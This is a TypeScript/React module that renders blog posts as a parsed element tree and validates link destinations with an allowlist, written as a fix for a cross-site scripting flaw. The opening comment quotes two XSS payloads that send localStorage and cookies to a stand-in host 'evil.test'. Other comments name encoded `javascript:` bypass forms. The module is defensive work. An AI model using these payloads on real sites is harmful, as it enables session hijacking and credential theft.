/**
 * Blog body rendering — structured, never a string of markup (F-1).
 *
 * The previous implementation built an HTML string, escaped only `& < >`, and injected the result
 * with `dangerouslySetInnerHTML`. Two escapes were missing where they mattered:
 *
 *   [Read more](javascript:location='//evil.test/?t='+localStorage.x)
 *   [x](a" onmouseover="location='//evil.test/?c='+document.cookie)
 *
 * The first produced a working `javascript:` link; the second closed the `href` attribute and
 * opened an event handler. Any COUNSELOR can author a blog post, the blog is public, and the staff
 * back office lives on the same origin with its JWT in `localStorage`, so one hover was a path from
 * a content role to a staff session.
 *
 * The fix is structural rather than a better regex. This module never produces HTML: it parses the
 * Markdown into a tree of blocks and inline spans, and `MarkdownBody` renders that tree with React.
 * React escapes text and attribute values itself, so there is no attribute context for untrusted
 * text to escape into, and there is no `dangerouslySetInnerHTML` for user content anywhere in the
 * application. Raw HTML in a post is therefore not "sanitised" — it is not markup at all, it is the
 * characters the author typed.
 *
 * Two rules follow from that and are enforced here:
 *
 * 1. **A destination is a URL or nothing.** `safeHref` allows `http:`, `https:`, `mailto:`, `tel:`
 *    and same-site relative paths, and returns `null` for everything else. A refused destination
 *    degrades to its own link text — the post still reads correctly, and nothing executable is
 *    produced. The check normalises the way a browser does before deciding (control characters and
 *    whitespace removed, scheme lower-cased, percent- and entity-encoded forms that a browser
 *    would *not* decode stay literal and fail the allowlist), and re-parses allowed absolute URLs
 *    so the stored value is the browser's own canonical form.
 * 2. **Nothing is ever truncated to fit.** A refused link is not rewritten into a shortened one.
 */
import { createElement, type ReactNode } from "react";

/** One span of inline content. `link` is the only kind that carries a destination. */
export type Inline =
  | { kind: "text"; text: string }
  | { kind: "strong"; text: string }
  | { kind: "em"; text: string }
  | { kind: "code"; text: string }
  | { kind: "link"; text: string; href: string };

/** One block-level element. Lists carry inline runs, one per item. */
export type Block =
  | { kind: "p" | "h2" | "h3" | "quote"; inlines: Inline[] }
  | { kind: "ul" | "ol"; items: Inline[][] };

/** Schemes a post may link to. Everything else — `javascript:`, `data:`, `vbscript:`, `file:` — is
 *  refused. `http:` is allowed for old institutional pages that never got a certificate. */
const ALLOWED_SCHEMES = new Set(["http:", "https:", "mailto:", "tel:"]);

/** A relative destination is allowed to look like a path and nothing else: no quotes, no angle
 *  brackets, no backslashes, no braces, no control characters. A store of relative URLs is not a
 *  place for characters whose meaning depends on where they land. */
const SAFE_RELATIVE = /^[^\u0000-\u001f\u007f"'<>\\{}|^`]+$/;

/** An HTML character reference. `javascript&colon;alert(1)` is a relative path to this module and a
 *  `javascript:` URL to an HTML parser, and a destination whose scheme depends on *which* parser
 *  reads it is not a destination. A relative link can always be written with the real character. */
const CHAR_REFERENCE = /&(#\d+|#[xX][0-9a-fA-F]+|[a-zA-Z][a-zA-Z0-9]*);/;

/** Characters a browser ignores when it decides which scheme a URL has. */
const IGNORED_IN_URL = /[\u0000-\u0020\u007f-\u009f\u00a0\u1680\u2000-\u200f\u2028\u2029\u202f\u205f\u3000\ufeff]/g;

/**
 * The destination of a link, or `null` when it must not become one.
 *
 * Returns a value that is safe to place in an `href`: either an absolute URL re-serialised by the
 * platform's own parser or a relative path that passed `SAFE_RELATIVE`. There is no branch that
 * returns the caller's string unexamined.
 */
export function safeHref(raw: unknown): string | null {
  const text = String(raw ?? "");
  // Normalised for *inspection* only. `java\nscript:` and `  JaVaScRiPt:` are the same scheme to a
  // browser, and every one of these characters is stripped before a URL is parsed.
  const compact = text.replace(IGNORED_IN_URL, "");
  if (!compact) return null;
  // A NUL byte or a lone newline inside a destination is a signature of an encoding trick, not of
  // a link someone meant to write.
  if (/[\u0000]/.test(text)) return null;

  const scheme = /^([A-Za-z][A-Za-z0-9+.\-]*):/.exec(compact);
  if (scheme) {
    const name = `${scheme[1].toLowerCase()}:`;
    if (!ALLOWED_SCHEMES.has(name)) return null;
    if (name === "mailto:" || name === "tel:") {
      // Addresses and numbers: no request is made by the page itself, and the target is a mail
      // client or dialler. Quotes would be escaped by React anyway; refuse them here so the stored
      // value cannot be mistaken for markup by anything downstream.
      return /["'<>]/.test(compact) ? null : compact;
    }
    let parsed: URL;
    try {
      // Parse the author's text, trimmed, rather than the whitespace-stripped form used for the
      // scheme decision: stripping space can fuse two path segments into a different URL
      // (".../a b" -> ".../ab"), and a validator must not silently rewrite a destination into
      // another one. The platform parser percent-encodes what it must.
      parsed = new URL(text.trim());
    } catch {
      return null;
    }
    // Re-check after parsing: whitespace tricks that survived normalisation would change the
    // protocol the platform itself reports.
    if (parsed.protocol.toLowerCase() !== name) return null;
    if ((name === "http:" || name === "https:") && !parsed.hostname) return null;
    return parsed.href;
  }

  // No scheme. Anything with a colon before its first `/`, `?` or `#` is a scheme-like token that
  // is not on the allowlist (`data:text/html,...`, or a partially encoded `javascript%3A...` whose
  // colon appears later) and is refused rather than guessed at.
  const colon = compact.indexOf(":");
  const separator = compact.search(/[/?#]/);
  if (colon !== -1 && (separator === -1 || colon < separator)) return null;
  // Protocol-relative `//host/path` is a link to somewhere else wearing a relative link's clothes.
  if (compact.startsWith("//")) return null;
  if (CHAR_REFERENCE.test(compact)) return null;
  // `javascript%3Aalert(1)` is a relative path today: a browser does not percent-decode a scheme.
  // It is refused anyway, because "it stays relative" depends on the parser, and a colon in a
  // path can always be written as a colon.
  if (/%3a/i.test(compact)) return null;
  const trimmed = text.trim();
  return SAFE_RELATIVE.test(trimmed) ? trimmed : null;
}

/** True when a href leaves this site (used only to attach `rel`, never to filter). */
function isExternal(href: string): boolean {
  return /^(https?:)?\/\//i.test(href) || /^(mailto|tel):/i.test(href);
}

/**
 * One pass over the text, for every inline construct.
 *
 * The first version of this function re-ran four separate regexes against the whole remaining
 * string for each construct it found, which is quadratic. `*a*` repeated 60,000 times (180 KB) took
 * about 12 seconds of CPU in a server render, and the page is regenerated on revalidation: a body
 * is still input, and a renderer that can be made to burn seconds of event-loop time is an
 * availability defect of its own. Scanning once with a single alternation and a moving
 * `lastIndex` visits each character a bounded number of times.
 *
 * Alternation order is precedence order at a given start position (code wins over emphasis), and
 * the earliest match anywhere in the text wins - which is what the previous version did as well.
 * The link destination stops at whitespace or a parenthesis: a value that needs those characters
 * is not a link this renderer can express, and refusing it degrades to text.
 */
const INLINE_ALL = new RegExp(
  [
    "`([^`\\n]+)`",                                        // 1: code span
    "\\*\\*([^*\\n]+)\\*\\*",                              // 2: strong
    "\\*([^*\\n]+)\\*",                                    // 3: emphasis
    "\\[([^\\[\\]\\n]*)\\]\\(([^()\\s]*)\\)",            // 4: link text, 5: destination
  ].join("|"),
  "g",
);

function pushText(out: Inline[], text: string): void {
  if (!text) return;
  const last = out[out.length - 1];
  if (last && last.kind === "text") last.text += text;
  else out.push({ kind: "text", text });
}

/** Parse one line of inline Markdown into spans. Pure: no HTML, no escaping, no evaluation. */
export function parseInline(source: string): Inline[] {
  const out: Inline[] = [];
  const text = String(source ?? "");
  let cursor = 0;
  INLINE_ALL.lastIndex = 0;
  let m: RegExpExecArray | null;
  while ((m = INLINE_ALL.exec(text)) !== null) {
    if (m[0].length === 0) {
      // Not reachable with these alternatives, but a zero-width match must never spin the loop.
      INLINE_ALL.lastIndex += 1;
      continue;
    }
    if (m.index > cursor) pushText(out, text.slice(cursor, m.index));
    if (m[1] !== undefined) {
      out.push({ kind: "code", text: m[1] });
    } else if (m[2] !== undefined) {
      out.push({ kind: "strong", text: m[2] });
    } else if (m[3] !== undefined) {
      out.push({ kind: "em", text: m[3] });
    } else {
      const href = safeHref(m[5] ?? "");
      if (href) out.push({ kind: "link", text: m[4] ?? "", href });
      // A refused destination is not a link: the author's words survive as text.
      else pushText(out, m[4] ?? "");
    }
    cursor = m.index + m[0].length;
  }
  if (cursor < text.length) pushText(out, text.slice(cursor));
  return out;
}

/** Parse a post body into blocks. Line-oriented, like the renderer it replaces. */
export function parseMarkdown(source: string): Block[] {
  const out: Block[] = [];
  let list: { kind: "ul" | "ol"; items: Inline[][] } | null = null;

  const closeList = () => {
    if (list) {
      out.push(list);
      list = null;
    }
  };

  for (const raw of String(source ?? "").split("\n")) {
    const line = raw.trimEnd();
    if (!line.trim()) {
      closeList();
      continue;
    }
    let m: RegExpExecArray | null;
    if ((m = /^###\s+(.*)$/.exec(line))) {
      closeList();
      out.push({ kind: "h3", inlines: parseInline(m[1]) });
      continue;
    }
    if ((m = /^##\s+(.*)$/.exec(line))) {
      closeList();
      out.push({ kind: "h2", inlines: parseInline(m[1]) });
      continue;
    }
    if ((m = /^>\s?(.*)$/.exec(line))) {
      closeList();
      out.push({ kind: "quote", inlines: parseInline(m[1]) });
      continue;
    }
    if ((m = /^\d+\.\s+(.*)$/.exec(line))) {
      if (list?.kind !== "ol") {
        closeList();
        list = { kind: "ol", items: [] };
      }
      list.items.push(parseInline(m[1]));
      continue;
    }
    if ((m = /^[-*]\s+(.*)$/.exec(line))) {
      if (list?.kind !== "ul") {
        closeList();
        list = { kind: "ul", items: [] };
      }
      list.items.push(parseInline(m[1]));
      continue;
    }
    closeList();
    out.push({ kind: "p", inlines: parseInline(line) });
  }
  closeList();
  return out;
}

const LINK_CLASS = "text-brand-800 underline underline-offset-2";

/** Render spans as React nodes. Every string here becomes a text node, never markup. */
export function renderInline(inlines: Inline[]): ReactNode[] {
  return inlines.map((span, i) => {
    switch (span.kind) {
      case "strong":
        return createElement("strong", { key: i }, span.text);
      case "em":
        return createElement("em", { key: i }, span.text);
      case "code":
        return createElement("code", { key: i }, span.text);
      case "link":
        return createElement(
          "a",
          {
            key: i,
            href: span.href,
            className: LINK_CLASS,
            // Meaningful only if a future change adds target=_blank; harmless now, and it keeps
            // an outbound link from handing the destination a handle on this window.
            ...(isExternal(span.href) ? { rel: "noopener noreferrer" } : {}),
          },
          span.text,
        );
      default:
        return span.text;
    }
  });
}

/** Render parsed blocks as React nodes. */
export function renderBlocks(blocks: Block[]): ReactNode[] {
  return blocks.map((block, i) => {
    switch (block.kind) {
      case "h2":
        return createElement("h2", { key: i }, renderInline(block.inlines));
      case "h3":
        return createElement("h3", { key: i }, renderInline(block.inlines));
      case "quote":
        return createElement("blockquote", { key: i }, renderInline(block.inlines));
      case "ul":
        return createElement(
          "ul",
          { key: i },
          block.items.map((item, j) => createElement("li", { key: j }, renderInline(item))),
        );
      case "ol":
        return createElement(
          "ol",
          { key: i },
          block.items.map((item, j) => createElement("li", { key: j }, renderInline(item))),
        );
      default:
        return createElement("p", { key: i }, renderInline(block.inlines));
    }
  });
}

/**
 * The blog body, as elements rather than as a markup string.
 *
 * Kept in a `.ts` file built from `createElement` rather than JSX so the test suite can render the
 * exact production tree with `react-dom/server` and inspect the resulting DOM — the check has to be
 * on what the browser receives, not on what this module intended.
 */
export function MarkdownBody({ source, className }: { source: string; className?: string }) {
  return createElement(
    "div",
    { className: className ?? "prose-body mt-6 text-slate-700" },
    renderBlocks(parseMarkdown(source)),
  );
}
